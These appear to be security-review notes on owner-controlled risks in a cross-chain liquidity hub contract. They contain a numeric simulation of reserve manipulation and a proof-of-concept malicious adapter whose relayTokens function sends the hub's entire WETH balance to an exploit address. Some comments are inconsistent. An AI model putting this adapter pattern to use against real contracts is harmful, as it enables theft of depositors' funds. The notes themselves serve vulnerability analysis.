### haircutReserves

```solidity
function haircutReserves(address l1Token, int256 haircutAmount) public onlyOwner nonReentrant {
    pooledTokens[l1Token].utilizedReserves -= haircutAmount;
}
```

1. we add liquidity, for example `l1TokenAmount = 100000` tokens, get `lpTokenAmount = (l1TokenAmount * 1e18) / _exchangeRateCurrent(l1Token)`
2. owner executes haircutReserves() and changes utilizedReserves
3. we remove liquidity and get `l1Tokens = (lpTokenAmount * _exchangeRateCurrent(l1Token)) / 1e18`


#### Simulation

```
get some real params for WETH contract:

address lpToken = 0x28F77208728B0A45cAb24c4868334581Fe86F95B
uint32 lastLpFeeUpdate = 1742478023
uint256 undistributedLpFees = 2495510634873076907
uint256 liquidReserves = 15593038486308420640717
int256 utilizedReserves = 3081310457640993279566
```


```solidity
contract Simulation {
    uint256 undistributedLpFees = 2495510634873076907;
    uint256 liquidReserves = 15593038486308420640717;
    uint256 totalSupply = 17029603465356381254203;
    int256 utilizedReserves = 3081310457640;  // can change

    function exchangeRate() public view returns (uint256) {
        // _updateAccumulatedLpFees(pooledToken); 
        // _sync(l1Token);

        int256 numerator = int256(liquidReserves) + utilizedReserves - int256(undistributedLpFees);
        return (uint256(numerator) * 1e18) / totalSupply;
    }

    function removeLiquidity(uint256 lpTokenAmount) external view returns (uint256) {
        return (lpTokenAmount * exchangeRate()) / 1e18;
    }
}

// *** assume we have 100000 lpTokens:
// 1. int256 utilizedReserves = 3081310457640993279566
// 2. lpTokens = 100000
// 3. l1Token = 109643

// *** increase utilizedReserves, haircutAmount < 0 -> we get more l1 tokens than deposited: 
// 1. int256 utilizedReserves = 3081310457640993279566000
// 2. lpTokens = 100000
// 3. l1Token = 18185397

// *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
// 1. int256 utilizedReserves = 3081310457640
// 2. lpTokens = 100000
// 3. l1Token = 91549

// *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
// *** !!! have saturation
// 1. int256 utilizedReserves = 308131045
// 2. lpTokens = 100000
// 3. l1Token = 91549
```

> _updateAccumulatedLpFees(pooledToken) and _sync(l1Token) don't affect on exchangeRate, \if only haircutReserves() was called
        


### setCrossChainContracts

```solidity
    function setCrossChainContracts(
        uint256 l2ChainId,
        address adapter,
        address spokePool
    ) public override onlyOwner nonReentrant {
        crossChainContracts[l2ChainId] = CrossChainContract(adapter, spokePool);
        emit CrossChainContractsSet(l2ChainId, adapter, spokePool);
    }
```

Here we can withdraw all tokens: here we do adapter.delegatecall.

```
call trace:                                who calls
setCrossChainContracts                                 msg.sender = owner
executeRootBundle                                      msg.sender = attacker(EOA)
    _sendTokensToChainAndUpdatePooledTokenTrackers     msg.sender = attacker(EOA)
        (bool success, ) = adapter.delegatecall(       msg.sender = attacker(EOA)
                    abi.encodeWithSignature(
                        "relayTokens(address,address,uint256,address)",
                        l1Token, // l1Token.
                        l2Token, // l2Token.
                        uint256(netSendAmounts[i]), // amount.
                        spokePool // to. This should be the spokePool.
                    )
                );
```

Possible attack vector in single transaction (all liquidity is on Hub contract):
1. set new `adapter` in setCrossChainContracts
3. attacker calls executeRootBundle(inside we call internal function _sendTokensToChainAndUpdatePooledTokenTrackers()):
4. in `adapter`.delegatecall (in context of msg.sender - attacker):

```solidity
// this function is defined in new adapter contract
address immutable private EXPLOIT_ADDRESS
function relayTokens(address,address,uint256,address) {
    // here is msg.sender is still attacker
    IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    token.transfer(EXPLOIT_ADDRESS, token.balanceOf(address(this))); // msg.sender in approve is HUB
}
```

```solidity
    function executeRootBundle(
        uint256 chainId,
        uint256 groupIndex,
        uint256[] memory bundleLpFees,
        int256[] memory netSendAmounts,
        int256[] memory runningBalances,
        uint8 leafId,
        address[] memory l1Tokens,
        bytes32[] calldata proof
    ) public nonReentrant unpaused {
        require(getCurrentTime() > rootBundleProposal.challengePeriodEndTimestamp, "Not passed liveness");

        // Verify the leafId in the poolRebalanceLeaf has not yet been claimed.
        require(!MerkleLib.isClaimed1D(rootBundleProposal.claimedBitMap, leafId), "Already claimed");

        // Verify the props provided generate a leaf that, along with the proof, are included in the merkle root.
        require(
            MerkleLib.verifyPoolRebalance(
                rootBundleProposal.poolRebalanceRoot,
                PoolRebalanceLeaf({
                    chainId: chainId,
                    groupIndex: groupIndex,
                    bundleLpFees: bundleLpFees,
                    netSendAmounts: netSendAmounts,
                    runningBalances: runningBalances,
                    leafId: leafId,
                    l1Tokens: l1Tokens
                }),
                proof
            ),
            "Bad Proof"
        );
        // Grouping code that uses adapter and spokepool to avoid stack too deep warning.
        // Get cross chain helpers for leaf's destination chain ID. This internal method will revert if either helper
        // is set improperly.
        (address adapter, address spokePool) = _getInitializedCrossChainContracts(chainId);

        // Set the leafId in the claimed bitmap.
        rootBundleProposal.claimedBitMap = MerkleLib.setClaimed1D(rootBundleProposal.claimedBitMap, leafId);

        // Decrement the unclaimedPoolRebalanceLeafCount.
        --rootBundleProposal.unclaimedPoolRebalanceLeafCount;

        // Relay each L1 token to destination chain.
        // Note: if any of the keccak256(l1Tokens, chainId) combinations are not mapped to a destination token address,
        // then this internal method will revert. In this case the admin will have to associate a destination token
        // with each l1 token. If the destination token mapping was missing at the time of the proposal, we assume
        // that the root bundle would have been disputed because the off-chain data worker would have been unable to
        // determine if the relayers used the correct destination token for a given origin token.
        _sendTokensToChainAndUpdatePooledTokenTrackers(
            adapter,
            spokePool,
            chainId,
            l1Tokens,
            netSendAmounts,
            bundleLpFees
        );

        // Check bool used by data worker to prevent relaying redundant roots to SpokePool.
        if (groupIndex == 0) {
            // Relay root bundles to spoke pool on destination chain by
            // performing delegatecall to use the adapter's code with this contract's context.

            // We are ok with this low-level call since the adapter address is set by the admin and we've
            // already checked that its not the zero address.
            // solhint-disable-next-line avoid-low-level-calls
            (bool success, ) = adapter.delegatecall(
                abi.encodeWithSignature(
                    "relayMessage(address,bytes)",
                    spokePool, // target. This should be the spokePool on the L2.
                    abi.encodeWithSignature(
                        "relayRootBundle(bytes32,bytes32)",
                        rootBundleProposal.relayerRefundRoot,
                        rootBundleProposal.slowRelayRoot
                    ) // message
                )
            );
            require(success, "delegatecall failed");
        }

        // Transfer the bondAmount back to the proposer, if this the last executed leaf. Only sending this once all
        // leaves have been executed acts to force the data worker to execute all bundles or they won't receive their bond.
        if (rootBundleProposal.unclaimedPoolRebalanceLeafCount == 0)
            bondToken.safeTransfer(rootBundleProposal.proposer, bondAmount);

        emit RootBundleExecuted(
            groupIndex,
            leafId,
            chainId,
            l1Tokens,
            bundleLpFees,
            netSendAmounts,
            runningBalances,
            msg.sender
        );
    }

```
